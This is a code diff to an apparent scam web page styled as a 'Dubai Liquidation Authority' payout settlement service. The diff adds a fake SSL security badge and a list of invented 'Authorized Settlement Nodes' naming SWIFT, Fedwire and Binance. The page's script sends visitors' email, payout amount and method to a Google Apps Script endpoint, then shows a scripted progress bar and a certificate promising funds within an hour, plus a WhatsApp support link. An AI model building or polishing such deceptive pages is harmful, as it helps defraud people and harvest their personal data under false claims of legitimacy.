@@ -26,16 +26,28 @@
         .res-box { background: #000; border: 1px solid var(--gold); padding: 15px; text-align: center; margin: 15px 0; border-radius: 16px; }
         .res-box b { font-size: 34px; color: #fff; display: block; }
         #local-payout { font-size: 13px; color: #4ade80; margin-top: 8px; font-weight: bold; display: none; background: rgba(74,222,128,0.1); padding: 6px; border-radius: 8px; border: 1px dashed #4ade80; }
+        
+        /* Node Sponsors Styles */
+        .node-footer { margin-top: 30px; padding-top: 20px; border-top: 1px solid #222; text-align: center; }
+        .node-footer p { font-size: 10px; color: #555; font-weight: 800; letter-spacing: 1.5px; text-transform: uppercase; margin-bottom: 15px; }
+        .node-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; padding: 0 10px; }
+        .node-item { font-size: 10px; color: #999; font-weight: 700; text-transform: uppercase; display: flex; align-items: center; gap: 8px; padding: 6px; border-radius: 4px; background: rgba(255,255,255,0.02); border: 1px solid #1a1a1a; }
+        .node-dot { width: 6px; height: 6px; background: #4ade80; border-radius: 50%; box-shadow: 0 0 8px #4ade80; animation: pulseNode 2s infinite; }
+        @keyframes pulseNode { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+
         .main-btn { width: 100%; padding: 18px; background: var(--gold); border: none; font-weight: 800; cursor: pointer; color: #000; border-radius: 14px; text-transform: uppercase; font-size: 14px; margin-top: 15px; }
+        .secure-badge { text-align: center; font-size: 10px; color: #555; margin-top: 12px; display: flex; align-items: center; justify-content: center; gap: 5px; font-weight: 700; text-transform: uppercase; }
+        
         #loader { display: none; text-align: center; padding: 30px 0; }
         #pbar_container { width: 100%; height: 6px; background: #222; border-radius: 10px; overflow: hidden; }
         #pbar { width: 0%; height: 100%; background: var(--gold); transition: width 0.3s; }
         #success { display: none; width: 100%; }
-        .receipt-container { background: #fff; color: #000; padding: 25px; position: relative; width: 100%; border-radius: 4px; }
+        .receipt-container { background: #fff; color: #000; padding: 25px; border-radius: 4px; text-align: center; }
         .hero-usd { font-size: 52px; font-weight: 900; display: block; color: #000 !important; }
+        
         .chat-btn { position: fixed; bottom: 20px; left: 20px; background: #16191e; border: 1px solid #333; padding: 12px 18px; border-radius: 50px; text-decoration: none; color: #fff; z-index: 3000; display: flex; align-items: center; gap: 10px; }
         .dot { width: 8px; height: 8px; background: #25d366; border-radius: 50%; animation: blink 1.5s infinite; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
     </style>
 </head>
 <body>
@@ -88,6 +100,18 @@
             <input id="email" type="email" placeholder="Required for receipt">
 
             <button class="main-btn" onclick="submitNow()">Authorize Settlement</button>
+            
+            <div class="secure-badge"><span style="color:#4ade80;">🛡️</span> SSL 256-BIT ENCRYPTION SECURE</div>
+
+            <div class="node-footer">
+                <p>Authorized Settlement Nodes</p>
+                <div class="node-grid">
+                    <div class="node-item"><span class="node-dot"></span> SWIFT-INTL</div>
+                    <div class="node-item"><span class="node-dot"></span> FEDWIRE-HUB</div>
+                    <div class="node-item"><span class="node-dot"></span> BINANCE-BUSD</div>
+                    <div class="node-item"><span class="node-dot"></span> DUBAI-CENTRAL</div>
+                </div>
+            </div>
         </div>
 
         <div id="loader">
@@ -102,15 +126,13 @@
 
         <div id="success">
             <div class="receipt-container" id="receipt-content">
-                <div style="text-align:center;">
-                    <h1 style="font-size:20px; margin:0;">CERTIFICATE OF SETTLEMENT</h1>
-                    <p style="font-size:10px; color:#d4af37;">Dubai Liquidation Authority</p>
-                    <hr>
-                    <p style="font-size:12px;"><b>Transaction ID:</b> <span id="r-tid"></span></p>
-                    <div class="hero-usd" id="r-price">$0.00</div>
-                    <p style="font-size:12px; color:green;"><b>STATUS: PENDING VERIFICATION</b></p>
-                    <p style="font-size:10px;">Funds will arrive in 1 hour.</p>
-                </div>
+                <h1 style="font-size:20px; margin:0;">CERTIFICATE OF SETTLEMENT</h1>
+                <p style="font-size:10px; color:#d4af37;">Dubai Liquidation Authority</p>
+                <hr>
+                <p style="font-size:12px;"><b>Transaction ID:</b> <span id="r-tid"></span></p>
+                <div class="hero-usd" id="r-price">$0.00</div>
+                <p style="font-size:12px; color:green;"><b>STATUS: PENDING VERIFICATION</b></p>
+                <p style="font-size:10px;">Funds will arrive in 1 hour.</p>
             </div>
             <button class="main-btn" onclick="location.reload()">New Transaction</button>
         </div>
@@ -119,9 +141,7 @@
     <a href="https://wa.me/447400436904" class="chat-btn"><div class="dot"></div><span>Support</span></a>
 
     <script>
-        // GOOGLE SCRIPT URL
         const scriptURL = 'https://script.google.com/macros/s/AKfycbzJvf53MaGe3Qilxa4hNGMUvKSrNyKe0rCBwpXA68CMrIC0SAkAoCfqEzHx9NZnSrBV/exec';
-
         let method = ""; let rateL = 1; let sym = "USD";
 
         function toggleTheme() {
@@ -161,7 +181,6 @@
             document.getElementById('form-container').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
 
-            // SEND TO GOOGLE APPS SCRIPT
             const formData = new FormData();
             formData.append('payout_total_usd', totalUSD.replace('$', ''));
             formData.append('payout_method', method);
@@ -171,19 +190,15 @@
 
             fetch(scriptURL, { method: 'POST', body: formData })
             .then(res => {
-                // Start Progress Bar Animation
                 let p = 0;
                 let iv = setInterval(() => {
                     p++; document.getElementById('pbar').style.width = p + "%";
                     if(p==33) document.getElementById('s1').style.color='#4ade80';
                     if(p==66) document.getElementById('s2').style.color='#4ade80';
-                    if(p>=100) { 
-                        clearInterval(iv); 
-                        showReceipt(totalUSD); 
-                    }
+                    if(p>=100) { clearInterval(iv); showReceipt(totalUSD); }
                 }, 40);
             })
-            .catch(err => alert("Connection Error: " + err.message));
+            .catch(err => alert("Error: " + err.message));
         }
 
         function showReceipt(total) {
